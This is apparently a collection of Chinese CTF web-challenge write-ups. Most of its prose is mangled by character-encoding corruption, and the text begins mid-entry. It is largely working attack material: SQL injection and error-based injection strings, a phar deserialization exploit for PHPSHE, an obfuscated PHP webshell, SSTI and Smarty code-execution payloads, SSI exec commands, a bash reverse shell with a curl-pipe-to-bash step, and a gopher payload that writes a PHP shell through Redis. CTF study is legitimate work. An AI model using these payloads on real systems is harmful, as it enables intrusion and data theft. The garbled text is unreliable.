stmt1;--+ æ–¹æ³•2:é‡å‘½åè¡¨åï¼Œå­—æ®µå payloadï¼š 1';alter table `1919810931114514` add(id int NULL);rename table `words` to `tmp`;rename table `1919810931114514` to `words`; easysqlâ€‹ è¿™é‡Œæ¶‰åŠMYSQLçš„ä¸€ç§ç®¡é“ç¬¦æ¨¡å¼ã€‚å¯ä»¥åœ¨MYSQLä¸­å¼€å¯æ”¯æŒç®¡é“ç¬¦æ¥è¿›è¡Œå­—ç¬¦ä¸²çš„æ‹¼æ¥æ“ä½œã€‚æ„é€ payload : 11;set sql_mode=pipes_as_concat;select 1 æ¡ä»¶ï¼šæŸ¥è¯¢è¯­å¥ä¸­æœ‰||ã€‚ â€‹ è¿˜æœ‰ä¸€ç§payload 1*,2 â€‹ è¿™ç§ä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œè¿™æ ·å°±æŠŠæŸ¥è¯¢è¯­å¥åˆ†æˆäº†ä¸¤éƒ¨åˆ† SSRFMEâ€‹ æ–¹æ³•ä¸€ï¼šå­—ç¬¦ä¸²æ‹¼æ¥ â€‹ æºç ä¸­ç”Ÿæˆsignæ˜¯è¿™æ ·ä¸€è¡Œä»£ç  1hashlib.md5(secert_key + param + action).hexdigest() â€‹ ä½ å¾—åˆ°signæ˜¯è¿™æ ·çš„ â€‹ ä½ åªèƒ½å¾—åˆ°secret_key+param+scançš„å€¼ã€‚ â€‹ ç­¾åæ£€æµ‹ä»£ç æ˜¯è¿™æ ·çš„ â€‹ ç„¶åçœ‹åˆ°exec()é‡Œçš„ä»£ç (ä»£ç å°±ä¸å¸–äº†)ï¼Œå°±å¯ä»¥å¾—åˆ°è§£é¢˜æ–¹æ³•ï¼šç”¨scanæ¥è¯»flag.txtä¸­çš„å€¼ä¿å­˜åˆ°result.txtä¸­ï¼Œç„¶åç”¨readæŠŠå®ƒè¯»å‡ºæ¥ã€‚ â€‹ æ‰€ä»¥è®¿é—®/De1taï¼Œpayload:param=flag.txt,é€šè¿‡cookieä¸Šä¼ action=readscan,signçš„å€¼å¯ä»¥é€šè¿‡è®¿é—®/getSignä¸Šä¼ param=flag.txtreadæ¥è·å¾—ã€‚è¿™æ ·ä¸¤ç§signéƒ½æ˜¯secert_key+flag.txt+readscanï¼Œå®Œç¾çš„æ‹¼æ¥æˆåŠŸæ‹¿åˆ°flag â€‹ æ–¹æ³•äºŒï¼šlocal_fileè¯»å–æ–‡ä»¶ â€‹ å…ˆç”Ÿæˆå·²çŸ¥å€¼ï¼šmd5(secret_key+local-file:///proc/self/cwd/flag.txt +scan)ç„¶åç”¨hashpumpç”ŸæˆMD5(secret_key+local-file:///proc/self/cwd/flag.txt +scan+read)çš„å€¼å°±è¡Œäº†ã€‚ â€‹ ps:local-file:///proc/self/cwd/ä»£è¡¨å½“å‰ç›®å½•ï¼Œlocal-fileä¸€å®šè¦ç»å¯¹åœ°å€ã€‚ è¿™é‡Œæ¨èä¸€ä¸ªè¯¦ç»†çš„writeup SSRFMEä¸€é¢˜ä¸‰è§£ fakebookâ€‹ wafæ²¡æœ‰è¿‡æ»¤load_fileï¼Œç»™å‡ºäº†æ–‡ä»¶åœ°å€ï¼Œç›´æ¥load_fileè¯»å–/var/www/flag.php,payloadï¼š 11 union select 1,load_file('/var/www/flag.php'),1,1 å¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°flag [RCTF2015]EasySQLâ€‹ æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªç™»é™†ã€‚ â€‹ åœ¨ç”¨æˆ·ç•Œé¢æœ‰ä¸€ä¸ªé‡ç½®å¯†ç ï¼Œå¯èƒ½æ˜¯äºŒæ¬¡æ³¨å…¥ã€‚è¿”å›æ³¨å†Œé¡µé¢è¯•äº†ä¸€è¯•ï¼Œå‘ç°usernameå’Œemailå¤„å­˜åœ¨è¿‡æ»¤ã€‚é¦–å…ˆè¯•ä¸€ä¸‹é—­åˆç±»å‹ï¼Œæ³¨å†Œ&#39;12&quot;\\ç„¶åç™»é™†ï¼Œä¿®æ”¹å¯†ç å‘ç°æŠ¥é”™ã€‚ é‚£è¿™é¢˜åº”è¯¥æ˜¯ä¸€ä¸ªåŒå¼•å·é—­åˆçš„æŠ¥é”™æ³¨å…¥ã€‚æ¥ä¸‹æ¥å°±æ˜¯çˆ†è¡¨,åˆ—ã€‚ 11&quot;||updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x3a),1)# å‘ç°æœ‰ä¸ªflagè¡¨ï¼Œè¿›å»ä¹‹åæ²¡æœ‰flagï¼Œäºæ˜¯æœä¸€ä¸‹åˆ«çš„è¡¨ã€‚ 11&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x3a),1)# å‘ç°æ˜¾ç¤ºä¸å…¨ï¼Œé™åˆ¶ä¸€ä¸‹è¾“å‡º 11&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x3a),1)# å¾—åˆ°åˆ—åï¼Œè¿™é‡Œregexpæ˜¯æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ã€‚æ¥ä¸‹æ¥çˆ†flag 11&quot;||updatexml(1,concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a),1)# ä¹Ÿæ˜¯åŒæ ·æ˜¾ç¤ºä¸å…¨ï¼Œè¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªreverseå‡½æ•°åå‘è¾“å‡ºä¸€ä¸‹æŸ¥åˆ°çš„å­—ç¬¦ä¸²ã€‚ç„¶åè‡ªå·±æ‰‹åŠ¨æ‹¼ä¸€ä¸‹flagå°±å‡ºæ¥äº† 11&quot;||updatexml(1,reverse(concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a)),1)# [RoarCTF 2019]PHPSheâ€‹ ä¸€é“æ¡†æ¶ç±»çš„é¢˜ï¼Œå¯¹äºæ¡†æ¶ç±»çš„é¢˜ç›®ï¼Œä¸æ˜¯CVEå°±æ˜¯å‡ºé¢˜äººä¿®æ”¹äº†æºç åˆ¶é€ çš„æ¼æ´,è¿™é¢˜éƒ½æœ‰ã€‚ â€‹ â€‹ å‘ç°æ˜¯PHPSHE v1.7äºæ˜¯æœäº†ä¸€ä¸‹æœ‰ CVE-2019-9762ï¼Œåˆ†æä¸€ä¸‹ï¼Œåœ¨common.phpä¸­ï¼Œä¼šå¯¹ä¸Šä¼ çš„å‚æ•°çš„å˜é‡åæ ¹æ®ä¸Šä¼ æ–¹å¼åŠ ä¸Šå‰ç¼€ã€‚ â€‹ åˆ©ç”¨ç‚¹æ˜¯/include/plugin/payment/alipay/pay.phpï¼Œå˜é‡order_idæ˜¯å¯æ§çš„ã€‚ â€‹ é€šè¿‡getæ–¹å¼ä¸Šä¼ idï¼Œè¿›å…¥pe_dbholdå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†å‚æ•°è¿›è¡Œaddslashesè½¬ä¹‰å¤„ç†ï¼Œç„¶åä¼ å…¥äº†order_tableå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°å°†å˜é‡ç”¨ä¸‹åˆ’çº¿è¿›è¡Œæˆªå–ã€‚ â€‹ ç»§ç»­è·Ÿè¿›pe_selectå‡½æ•°ã€‚ â€‹ å‘ç°order_idä½œä¸ºè¡¨åè¢«ä¼ å…¥ï¼Œæ‰€ä»¥å¯ä»¥æ§åˆ¶order_idè¿›è¡Œæ³¨å…¥ã€‚å®˜ç½‘åŒ…ä¸­æœ‰phpshe.sqlå‘Šè¯‰æˆ‘ä»¬æ•°æ®åº“é…ç½®ã€‚ â€‹ å‘ç°adminè¡¨ä¸­æœ‰6ä¸ªå­—æ®µï¼Œä½†æ˜¯å­—æ®µåéƒ½æœ‰ä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥å¿…é¡»ç”¨æ— åˆ—åæ³¨å…¥ã€‚ â€‹ payload=pay` where 1=1 union select 1,2,((select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1)),4,5,6,7,8,9,10,11,12%23_ è§£å¯†å¾—åˆ°md5å¯†ç ã€‚ ç™»é™†åå°å‘ç°ä¸€å¤„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥ä¸Šä¼ jpg,txt,zipæ–‡ä»¶ï¼Œå¹¶å¯ä»¥å¾—åˆ°ç»å¯¹è·¯å¾„ã€‚ â€‹ â€‹ å°†é¢˜ç›®æºç å’Œå®˜æ–¹æºç diffä¹‹åå‘ç°é¢˜ç›®æºç pclzip.class.phpä¸­å¤šäº†ä¸€ä¸ª__destruct()ç±»ï¼Œä½œç”¨æ˜¯è§£å‹å‹ç¼©åŒ…ï¼Œæ‰€ä»¥ä¼°è®¡æ˜¯é€šè¿‡pharååºåˆ—åŒ–è§¦å‘ã€‚ â€‹ äºæ˜¯å…¨å±€æœç´¢includeäº†pclzip.class.phpçš„ç±»ï¼Œæ‰¾åˆ°è§¦å‘ç‚¹\\module\\admin\\moban.php, åˆ†æä¸€æ³¢ä»£ç ï¼Œå‘ç°delæ–¹æ³•ä¸­è°ƒç”¨pe_dirdel()æ–¹æ³•ï¼Œè·Ÿè¿›å‘ç°å«æœ‰pharè§¦å‘å‡½æ•°is_file()ï¼Œè€Œä¸”æ–‡ä»¶åé«˜åº¦å¯æ§ï¼Œæ‰€ä»¥æ€è·¯å°±å‡ºæ¥äº†ï¼Œä½¿ç”¨pharåè®®ååºåˆ—åŒ–ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè§£å‹å«æœ‰shellçš„å‹ç¼©åŒ…ï¼Œä½†æ˜¯è¿˜éœ€è¦é€šè¿‡pe_token_match()çš„æ£€éªŒ â€‹ è¿™ä¸ªå‡½æ•°ä½œç”¨æ˜¯æ£€éªŒtokenå’Œrefererå€¼ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°tokenæ˜¯ä»¥postæˆ–è€…getæ–¹å¼ä¸Šä¼ çš„ï¼Œé€šè¿‡å®¡æŸ¥ä»£ç ï¼Œå‘ç°tokenæ˜¯æ”¾åœ¨sessionä¸­çš„ï¼Œæ‰€ä»¥åªè¦sessionä¸å˜tokenå°±ä¸ä¼šå˜ï¼Œä¹‹å‰ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ä¹Ÿç”¨äº†tokenæ£€éªŒï¼Œä½†æ˜¯å¹¶ä¸éœ€è¦æˆ‘ä»¬æäº¤tokenï¼Œæ‰€ä»¥çŒœæµ‹tokenè—åœ¨éšè—è¡¨å•ä¸­ï¼Œæœç„¶æ‰¾åˆ°äº†ã€‚è‡³äºRefereråªè¦ä¸å’Œç½‘ç«™hostä¿æŒä¸€è‡´å°±å¥½äº†ã€‚ â€‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpclass PclZip&#123; // ----- Filename of the zip file var $zipname = ''; // ----- File descriptor of the zip file var $zip_fd = 0; // ----- Internal error handling var $error_code = 1; var $error_string = ''; // ----- Current status of the magic_quotes_runtime // This value store the php configuration for magic_quotes // The class can then disable the magic_quotes and reset it after var $magic_quotes_status; var $save_path; // -------------------------------------------------------------------------------- // Function : PclZip() // Description : // Creates a PclZip object and set the name of the associated Zip archive // filename. // Note that no real action is taken, if the archive does not exist it is not // created. Use create() for that. // -------------------------------------------------------------------------------- function __construct($p_zipname) &#123; //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', \"zipname=$p_zipname\"); // ----- Tests the zlib // ----- Set the attributes $this-&gt;zipname = $p_zipname; $this-&gt;zip_fd = 0; $this-&gt;magic_quotes_status = -1; // ----- Return //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1); return; &#125;&#125;$f=new PclZip(\"/var/www/html/data/attachment/brand/3.zip\");//è‡ªå·±ä¸Šä¼ çš„zipæ–‡ä»¶åœ°å€$f-&gt;save_path='/var/www/html/data';//è§£å‹ç¼©åœ°å€ï¼Œåªè¦ä¸ç¦»è°±$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹$phar-&gt;setMetadata($f); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering();?&gt; â€‹ å°†æ–‡ä»¶åå’Œå‹ç¼©è·¯å¾„æ”¹ä¸€æ”¹ï¼Œç”Ÿæˆpharæ–‡ä»¶æ”¹åtxtï¼Œä¸Šä¼ ï¼Œè§¦å‘ï¼Œä¸Šèœåˆ€ï¼Œ/flagä¸€æ°”å‘µæˆã€‚ [SUCTF 2018]GetShellä¸€æ‰“å¼€æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªé©¬ï¼Œå‘ç°å¯¹ç¬¬å…­ä½ä¹‹åçš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œäºæ˜¯å…ˆfuzzä¸€ä¸‹çœ‹å“ªäº›å¯è§å­—ç¬¦èƒ½ç”¨ã€‚ èƒ½ç”¨å­—ç¬¦åªæœ‰~&amp;()_[];ï¼Œå–åèƒ½ç”¨ï¼Œå› ä¸ºæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œæ‰€ä»¥urlç¼–ç ä¸èƒ½ç”¨ï¼Œé‚£æ€è·¯å°±æ˜¯ç”¨æ±‰å­—å–åå¾—åˆ°shellä»£ç  åœ¨UTF-8ç¼–ç æ ¼å¼ä¸‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€èˆ¬å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªæ±‰å­—ä¸€èˆ¬å ç”¨ä¸‰ä¸ªå­—èŠ‚ï¼Œå–åæ“ä½œä¼šæŠŠæ•°æ®å˜æˆå­—èŠ‚æµï¼ŒæŒ‰ä½å–åï¼ŒPHPä¼šå°†å–ååçš„å€¼å˜æˆå­—ç¬¦ä¸²å˜é‡ï¼Œå› ä¸ºè€ŒåŒå­—èŠ‚çš„UTF-8å­—ç¬¦äºŒè¿›åˆ¶ä¸€èˆ¬ä»¥11å¼€å¤´ï¼Œå–åä¹‹åä¼šæ¯”è¾ƒå°ï¼Œä¸€èˆ¬æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥ç¬¬äºŒã€ä¸‰ä¸ªå­—èŠ‚è·å¾—å¯è§å­—ç¬¦çš„æ¦‚ç‡é«˜ã€‚ 12345678&lt;?php$a='çœ‹';$a=(~$a);echo $a[1];11100111100111001000101100011000 01100011 01110100 18 c t//è¾“å‡ºc fuzzè„šæœ¬ 1234567891011121314&lt;?php$str=\"å›­é‚ªå¤Ÿè™¹åŠªè¹„é…¿æ—¥æ˜ŸåšèˆåŒ–é™¡ç®¡ç ”é¡·æ´»è†›å…¼çœŸæœä¸¸å¹³æ’ä¸Šçµ®è¾«æ¯å‰©ä»‹æµ·èŒ‚å†’éšœæŸ„çº§æœªä»ªè‚å‘ä¿­æ²¿è¡¥æœ½å”æŠ¥èªå°¤åˆ˜èµšå¦ˆç¬¼æ‰”ç¢ä½¿å¶ç‚æ¼ æ´å¸¸è‡´é­ç¡é›¾çº é¼»è²æ¡ƒéƒŠåŒ†æ¬£äºšæ´’è´ªè¨€å²”è¿ç›®å ¡èˆŸè£™æˆ·å±¿é˜¿è´¯ç¿æ±‰é—ç§Ÿæ¦œæ„‰ç”œç¢æ³¥é…±æ€ç›¼è´´é•‡è¯»\";//éšæœºå­—å…¸$j=0;$a='e';//æƒ³å¾—åˆ°çš„å­—ç¬¦for($i=0;mb_strlen($str, 'utf-8');$i++)&#123; $t=mb_substr($str, $i,1, 'utf-8'); $z=(~$t); if($z[1]==$a)&#123; echo $t; echo $z; die; &#125;&#125;//ç›®æ ‡assert_POST ç°åœ¨è¿˜éœ€è¦å¾—åˆ°1å°±èƒ½å¾—åˆ°æœ€ç»ˆpayloadäº†ï¼Œåœ¨PHPä¸­true=1; 123$__=[];$___=[];$_=$__==$___;//true=1 ç°åœ¨å°±å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„payload 1&lt;?=$__=[];$___=[];$_=$__==$___;$__=(~æœ);$___=$__[$_];$__=(~åŒ–);$___.=$__[$_];$___.=$__[$_];$__=(~éšœ);$___.=$__[$_];$__=(~æ·);$___.=$__[$_];$__=(~ç‹¬);$___.=$__[$_];$__=(~ç ”);$____=$__[$_];$__=(~æ¯);$____.=$__[$_];$__=(~å°¤);$____.=$__[$_];$__=(~ç¬¼);$____.=$__[$_];$__=(~ç«¿);$____.=$__[$_];$_____=$$____;$__=(~ç ”);$___($_____[$__[$_]]);//assert($_POST[_]); ä¸Šä¼ åæ‰§è¡Œsystem(â€˜cat /flagâ€™);è·å¾—flag [CISCN2019 åä¸œå—èµ›åŒº]Web4â€‹ fileåè®®è¢«BANï¼Œæ ¹æ®è·¯ç”±åˆ¤æ–­æ˜¯flaskï¼Œä»CVE-2019-9948å¯ä»¥å¾—çŸ¥local_fileå¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œè¯»å–æºç local_file///app/app.pyã€‚ â€‹ åœ¨/flagè·¯ç”±ä¸‹è·å–flag,è¦æ±‚username=fuckï¼Œéšæœºæ•°ç§å­è®¾ä¸ºuuid.getnode()ï¼Œè¯¥æ–¹æ³•ä¼šä½¿ç”¨æœºå™¨çš„macåœ°å€ä½œä¸ºé»˜è®¤éšæœºæ•°ç§å­ã€‚ local_file:///sys/class/net/eth0/addressè·å¾—éšæœºæ•°ç§å­ï¼Œ 123import randomrandom.seed(0x0242ae00fb24)print str(random.random()*233) ä½¿ç”¨flask-cookieå·¥å…·è·å¾—cookieï¼Œå¾—åˆ°flagã€‚ [BJDCTF2020]Cookie is so stableç½‘å›¾ 1234Twig &#123;&#123;7*&apos;7&apos;&#125;&#125; #è¾“å‡º49Jinja&#123;&#123;7*&apos;7&apos;&#125;&#125; #è¾“å‡º7777777 æµ‹è¯•å¾—åˆ°ä¸ºTwigæ¨¡æ¿æ³¨å…¥ [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpwebâ€‹ é¢˜ç›®ç”¨çš„call_user_func()ï¼Œå¹¶è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œfuzzä¸€ä¸‹æœ‰å•¥å‡½æ•°æ²¡è¿‡ç‡ï¼Œå‘ç°highlight_fileï¼Œè¯»æºç ï¼Œå‘ç°å­˜åœ¨ååºåˆ—åŒ–å¯ä»¥ç»•è¿‡WAFã€‚ [å®‰æ´µæ¯ 2019]easy_serialize_phpâ€‹ ååºåˆ—åŒ–é¢˜ï¼Œåœ¨phpinfoä¸­å¯ä»¥æ‰¾åˆ°flagä½ç½®ï¼Œè¿‡æ»¤æ—¶å­˜åœ¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œåˆ©ç”¨extract($_POST)æ’å…¥éæ³•å­—ç¬¦åˆ°$_SESSIONä¸­ã€‚ 12345678910111213&lt;?phpfunction filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;$b['user']=\"guest\";$b['function']=\"show_image\";$b['flagflag']='\";s:1:\"1\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";&#125;';//d0g3_f1ag.php$b['img']=base64_encode(\"guest_img.png\");echo serialize($b).\"\\n\";echo filter(serialize($b));var_dump(unserialize(filter(serialize($b)))); [MRCTF2020]PYWebsiteâ€‹ å…³é—­JSï¼ŒæŠ“åŒ…å¾—åˆ°ä¸€æ®µJSä»£ç ï¼ŒéªŒè¯æ— æ³•ç»•è¿‡ï¼Œç›´æ¥è®¿é—®flag.phpï¼Œä¿®æ”¹X-Forwarded-Forå¤´ï¼Œå¾—åˆ°flagã€‚ [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmapâ€‹ Nmap -oG å°†æŠ¥å‘Šä¿å­˜åˆ°æ–‡ä»¶ä¸­payload,çŸ­æ ‡ç­¾ï¼Œphtmlç»•è¿‡WAF:&#39; &lt;?= @eval($_POST[&quot;aa&quot;]);?&gt; -oG aa.phtml &#39;ã€‚ [BSidesCF 2020]Had a bad dayâ€‹ åœ¨categoryå‡ºéšä¾¿è¾“å…¥è·å¾—includeæŠ¥é”™ï¼Œä½¿ç”¨includeç‰¹æ€§å°è¯•åŒ…å«ä¸€æ³¢flag.php â€‹ woofers/../flag,å‘ç°flag.phpå­˜åœ¨ï¼Œå°è¯•ä½¿ç”¨PHP://filterä¼ªåè®®è¯»å–ä¸€æ³¢æºç ï¼Œå‘ç°categoryè¢«é™åˆ¶äº† 123if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\"))&#123; include ($file . '.php');&#125; â€‹ ä½¿ç”¨filterä¼ªåè®®ç‰¹ç‚¹ï¼Œå¯ä»¥æ·»åŠ ä¸€å±‚æ— ç”¨çš„ç­›é€‰åˆ—è¡¨ç»•è¿‡WAFã€‚ 1php://filter/read=convert.base64-encode/woofers/resource=flag ##[WUSTCTF2020]æœ´å®æ— å robots.txtå¯æ‰¾åˆ°æºç ï¼Œç¬¬ä¸€å…³intvalç»•è¿‡1e10ï¼Œç¬¬äºŒå…³å¼±ç±»å‹md5ï¼Œè¦æ±‚åŠ å¯†å‰å’ŒåŠ å¯†åéƒ½ä»¥0eå¼€å¤´è€Œä¸”åé¢éƒ½æ˜¯æ•°å­—ï¼Œçˆ†ç ´çœ‹è„¸ï¼Œç½‘ä¸Špayload0e215962017ï¼Œç¬¬ä¸‰å…³ä½¿ç”¨linuxç‰¹æ®Šç¯å¢ƒå˜é‡å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼ˆinternal field separatorï¼‰ ${IFS}ç»•è¿‡ç©ºæ ¼ã€‚ [BJDCTF2020]EasySearchindex.php.swpæ‰¾åˆ°æºç ï¼ŒSSIæ³¨å…¥ï¼Œé¦–å…ˆæ‰¾flag&lt;!--#exec cmd=&quot;find / -name fla*&quot;--&gt; &lt;!--#exec cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt; [GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–â€‹ éšæœºæ•°ç§å­çˆ†ç ´ 1234567891011str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'#å­—å…¸str2='U0Ssf69rN4'#å¯†æ–‡str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint res â€‹ ä¸‹è½½çˆ†ç ´å·¥å…· ï¼Œè¿›å…¥ç›®å½•makeä¸€ä¸‹ã€‚ â€‹ åœ¨ç›¸åº”ç¯å¢ƒï¼ˆPHP 7.1.0+ï¼‰ä¸‹ç”Ÿæˆpayloadã€‚ 123456789101112&lt;?phpmt_srand(503734369);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str;?&gt; [GYCTF2020]FlaskAppâ€‹ ä¸€é“flask SSTIï¼Œé€šè¿‡æ¨¡æ¿æ³¨å…¥æ‰¾åˆ°æºç  1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/etc/passwd&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼Œè¯»å–flagã€‚ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125; [CISCN2019 åä¸œå—èµ›åŒº]Web11æ‰“å¼€ç½‘ç«™å‘ç°è¦ç´ ï¼šbuild with smartyï¼Œåº”è¯¥æ˜¯ä¸€é“smartyæ¨¡æ¿æ³¨å…¥ï¼Œæ³¨å…¥ç‚¹åœ¨XFFå¤´ã€‚ {$smarty.version}å‘ç°smartyç‰ˆæœ¬æ˜¯3.1.30ï¼ŒæŸ¥çœ‹å¯¹åº”ç‰ˆæœ¬çš„å®˜æ–¹æ–‡æ¡£ï¼Œå‘ç°ä»»æ„å‡½æ•°æ‰§è¡Œæ¼æ´ã€‚ {if ä»»æ„å‡½æ•°æ‰§è¡Œ}{/if}ã€‚ payload={if system(&#39;cat /flag&#39;)}{/if} [BJDCTF 2nd]duangShellvim -rä¿®å¤æ–‡ä»¶å¾—åˆ°æºç ï¼Œexecæ— å›æ˜¾ï¼ŒåŸºæœ¬ä¸Šæ˜¯å¼¹shelläº†ï¼Œåœ¨æœåŠ¡å™¨éƒ¨ç½²ä¸€ä¸ªbashè„šæœ¬ 1bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 1curl http://ip/bashè„šæœ¬å | bash åå¼¹shellæˆåŠŸï¼Œä½¿ç”¨find / -name &quot;flag&quot;ï¼Œæ‰¾åˆ°flag [GKCTF2020]EZä¸‰å‰‘å®¢-EzWebæœ‰ä¸€ä¸ªè¾“å…¥urlçš„åœ°æ–¹ï¼ŒæŸ¥çœ‹ç•Œé¢æºç å‘ç°secretï¼Œæš´éœ²å‡ºå†…ç½‘IP ï¼Œåˆ©ç”¨httpæ‰«ä¸€æ³¢å†…ç½‘åœ°å€ï¼Œå‘ç°åœ¨173.109.229.12å­˜åœ¨æŸä¸ªæœåŠ¡ï¼Œæ‰«ä¸€æ³¢ç«¯å£ï¼Œå‘ç°æ˜¯RedisæœåŠ¡ï¼Œé¢˜ç›®è¿‡æ»¤äº†dictåè®®ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤gopheråè®®ï¼Œä¿®æ”¹ä¸€ä¸‹è„šæœ¬ï¼Œç›´æ¥ä¸€å‘æ‰“è¿‡å»ã€‚ 1gopher://173.109.229.12:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20/flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A åœ¨urlå¤„è¾“å…¥http://173.109.229.12/shell.phpå¾—åˆ°flagã€‚ [BJDCTF 2nd]elementmasteræ‰“å¼€ç•Œé¢æºç å‘ç°å¯ç–‘åå…­è¿›åˆ¶æ•°æ®ï¼Œè½¬æ¢ä¹‹åæ˜¯Po???,ç½‘ä¸Šæœäº†ä¸€ä¸‹å‘ç°æ˜¯å…ƒç´ å‘¨æœŸè¡¨ï¼ï¼ï¼ï¼Œä¸æ„§æ˜¯å…ƒç´ å¤§å¸ˆé¢˜ æŒ‰å…ƒç´ å‘¨æœŸè¡¨ä¸­çš„å…ƒç´ .phpä¾æ¬¡è®¿é—®(è„šæœ¬)ï¼Œå¾—åˆ°And_th3_3LemEnt5_w1LL_De5tR0y_y0u.phpï¼Œè®¿é—®å¾—åˆ°flagã€‚ [MRCTF2020]å¥—å¨ƒç¬¬ä¸€å…³å­—ç¬¦ä¸²è§£æç»•è¿‡ï¼ŒPHPä¼šå°†å˜é‡ä¸­å«æœ‰[.ç­‰éæ³•å­—ç¬¦è½¬æ¢æˆ_ï¼Œåˆ©ç”¨b.p.u.tç»•è¿‡ï¼Œç”¨æ¢è¡Œç¬¦%0aç»•è¿‡ç¾å…ƒç¬¦æ­£åˆ™ï¼Œè¿›å…¥ç¬¬äºŒå…³ã€‚ ä¸€å †jsfuckï¼Œä¸¢å…¥æ§åˆ¶å°ï¼Œå¾—åˆ°å‚æ•°Merak ,POSTä¼ å…¥Merak å¾—åˆ°æºç 